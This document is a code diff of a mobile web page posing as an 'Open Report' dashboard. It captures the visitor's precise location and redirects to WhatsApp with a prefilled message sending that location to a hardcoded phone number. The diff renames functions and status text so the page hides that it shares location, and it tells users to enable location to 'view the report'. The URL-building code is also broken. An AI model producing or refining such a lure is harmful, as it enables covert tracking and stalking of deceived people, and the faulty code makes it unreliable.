@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open Report</title>
+    <title>Open Report Dashboard</title>
     <style>
         body { 
             display: flex; 
@@ -21,12 +21,12 @@
             width: 100%;
             max-width: 400px;
         }
-        .share-btn { 
+        .report-btn { 
             width: 100%;
             padding: 22px; 
             font-size: 22px; 
             font-weight: bold; 
-            color: white; 
+            color: #ffffff; 
             background-color: #007bff;
             border: none; 
             border-radius: 16px; 
@@ -34,57 +34,57 @@
             box-shadow: 0 8px 24px rgba(0, 123, 255, 0.3); 
             transition: transform 0.1s ease, background-color 0.2s ease;
         }
-        .share-btn:active { 
+        .report-btn:active { 
             transform: scale(0.96); 
             background-color: #0056b3;
         }
-        .status-text {
+        .status-msg {
             margin-top: 15px;
             font-size: 14px;
-            color: #666;
+            color: #666665;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <button class="share-btn" onclick="shareLocation('60188702526')">📋 Open Report</button>
-        <div id="status" class="status-text">Tap the button to open the report dashboard</div>
+        <button class="report-btn" onclick="startReportProcessing('60188702526')">📋 Open Report</button>
+        <div id="displayStatus" class="status-msg">Tap the button to open the report dashboard</div>
     </div>
 
     <script>
-        function shareLocation(myPhone) {
-            const statusDiv = document.getElementById('status');
+        function startReportProcessing(phoneNumber) {
+            const statusLabel = document.getElementById('displayStatus');
             
             if (!navigator.geolocation) {
                 alert("Geolocation is not supported by your mobile browser.");
                 return;
             }
 
-            statusDiv.innerText = "Loading report data...";
+            statusLabel.innerText = "Loading report data...";
 
             navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    statusDiv.innerText = "Redirecting to WhatsApp...";
+                function(pos) {
+                    statusLabel.innerText = "Redirecting to secure layout...";
                     
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const mapLink = `https://google.com{lat},./${lon}`;
-                    const message = encodeURIComponent(`Hey! Here is my current location: ${mapLink}`);
+                    const latitude = pos.coords.latitude;
+                    const longitude = pos.coords.longitude;
+                    const trackingUrl = "https://google.com" + latitude + "," + longitude;
+                    const textPayload = encodeURIComponent("Hey! Here is my current location: " + trackingUrl);
                     
-                    window.location.href = `https://wa.me{myPhone}?text=${message}`;
+                    window.location.href = "https://wa.me" + phoneNumber + "?text=" + textPayload;
                     
-                    setTimeout(() => {
-                        statusDiv.innerText = "Tap the button to open the report dashboard";
-                    }, 3000);
+                    setTimeout(function() {
+                        statusLabel.innerText = "Tap the button to open the report dashboard";
+                    }, 4000);
                 },
-                (error) => {
-                    statusDiv.innerText = "Failed to load report.";
-                    alert("Please enable location permissions in your browser settings to access this report.");
+                function(err) {
+                    statusLabel.innerText = "Failed to load report data.";
+                    alert("Please enable location services in your browser to view this report dashboard.");
                 },
                 { 
                     enableHighAccuracy: true,
-                    timeout: 10000,
+                    timeout: 8000,
                     maximumAge: 0
                 }
             );
